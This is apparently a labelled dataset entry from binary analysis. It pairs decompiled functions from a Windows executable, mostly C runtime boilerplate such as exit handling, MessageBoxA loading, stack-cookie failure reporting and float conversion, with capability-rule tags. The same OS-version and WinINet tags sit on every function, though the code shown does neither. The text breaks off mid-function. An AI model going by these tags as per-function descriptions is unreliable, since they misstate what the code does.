{
    "00401729": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0040181c: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00401821)\n// WARNING: Removing unreachable block (ram,0x0040184f)\n// WARNING: Removing unreachable block (ram,0x00401827)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00401729(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00402820(0x4145b8, 0x18);\n    fcn.0040395b(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x41781c != 1) {\n        *0x417818 = 1;\n        *0x417814 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.004022cc(*0x2f8d268);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.004022cc(*0x2f8d264);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.004022c3();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.004022cc(*piVar2);\n                        iVar3 = fcn.004022c3();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.004022cc(*0x2f8d268);\n                        piVar1 = fcn.004022cc(*0x2f8d264);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.00401663(0x4131b0);\n        }\n        fcn.00401663(0x4131b8);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00403881(8);\n    }\n    return;\n}\n",
        "token_count": 795
    },
    "00403e13": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00403e13(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00403881(0);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "00403f13": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403f13(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.004022c3();\n    var_4h = 0;\n    if (*0x417f1c == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"USER32.DLL\");\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"MessageBoxA\");\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x417f1c = fcn.00402251(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, \"GetActiveWindow\");\n        *0x417f20 = fcn.00402251(uVar3);\n        uVar3 = (*pcVar4)(iVar2, \"GetLastActivePopup\");\n        *0x417f24 = fcn.00402251(uVar3);\n        uVar3 = (*pcVar4)(iVar2, \"GetUserObjectInformationA\");\n        *0x417f2c = fcn.00402251(uVar3);\n        if (*0x417f2c != 0) {\n            uVar3 = (*pcVar4)(iVar2, \"GetProcessWindowStation\");\n            *0x417f28 = fcn.00402251(uVar3);\n        }\n    }\n    if ((*0x417f28 != iVar1) && (*0x417f2c != iVar1)) {\n        pcVar4 = fcn.004022cc(*0x417f28);\n        pcVar5 = fcn.004022cc(*0x417f2c);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x00404055;\n        }\n    }\n    if ((((*0x417f20 != iVar1) && (pcVar4 = fcn.004022cc(*0x417f20),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x417f24 != iVar1 && (pcVar4 = fcn.004022cc(*0x417f24),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x00404055:\n    pcVar4 = fcn.004022cc(*0x417f1c);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 816
    },
    "00405319": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405319(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x416a00) {\n        return;\n    }\n    *0x418060 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x418064 = &arg_8h;\n    *0x417fa0 = 0x10001;\n    *0x417f48 = 0xc0000409;\n    *0x417f4c = 1;\n    var_328h = *0x416a00;\n    var_324h = *0x416a04;\n    *0x417f54 = unaff_retaddr;\n    *0x41802c = in_GS;\n    *0x418030 = in_FS;\n    *0x418034 = in_ES;\n    *0x418038 = in_DS;\n    *0x41803c = unaff_EDI;\n    *0x418040 = unaff_ESI;\n    *0x418044 = unaff_EBX;\n    *0x418048 = in_EDX;\n    *0x41804c = in_ECX;\n    *0x418050 = in_EAX;\n    *0x418054 = unaff_EBP;\n    *0x418058 = unaff_retaddr;\n    *0x41805c = in_CS;\n    *0x418068 = in_SS;\n    *0x417f98 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040547b(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x4142c4);\n    if (*0x417f98 == 0) {\n        fcn.0040547b(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 815
    },
    "0040f7de": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040f7de(void)\n\n{\n    uint unaff_EBX;\n    uint in_stack_fffffd2c;\n    uint in_stack_fffffd30;\n    uint var_2c8h;\n    \n    fcn.0040ff20();\n    fcn.0040f86a(unaff_EBX, in_stack_fffffd2c, in_stack_fffffd30);\n    return;\n}\n",
        "token_count": 91
    },
    "00410229": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410229(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0041072a;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0041035e;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x00410365;\ncode_r0x0041035e:\n                        do {\n                            var_4h = 1;\ncode_r0x00410365:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x00410373;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x00410373:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x4173b0 - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x4173b0 < iVar12) {\n                if (iVar12 < *0x4173ac) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x4173ac;\n                    uVar5 = 1;\n                }\n                goto code_r0x0041072a;\n            }\n            var_10h = *0x4173b0 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x00410516;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x00410516:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0041072a:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3660
    },
    "0041076d": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041076d(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x00410c6e;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x4173cc - 1;\n        iVar4 = *0x4173cc + (*0x4173cc >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x4173cc & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x004108a2;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x004108a9;\ncode_r0x004108a2:\n                        do {\n                            var_4h = 1;\ncode_r0x004108a9:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x004108b7;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x004108b7:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x4173c8 - *0x4173cc) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x4173c8 < iVar12) {\n                if (iVar12 < *0x4173c4) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x4173d8;\n                    iVar4 = *0x4173d0 + (*0x4173d0 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x4173d0 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x4173d0 + (*0x4173d0 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x4173d0 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x4173d8 + *0x4173c4;\n                    uVar5 = 1;\n                }\n                goto code_r0x00410c6e;\n            }\n            var_10h = *0x4173c8 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x4173cc - 1;\n            iVar12 = *0x4173cc + (*0x4173cc >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x4173cc & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x00410a5a;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x00410a5a:\n            *puVar1 = *puVar1 & -1 << 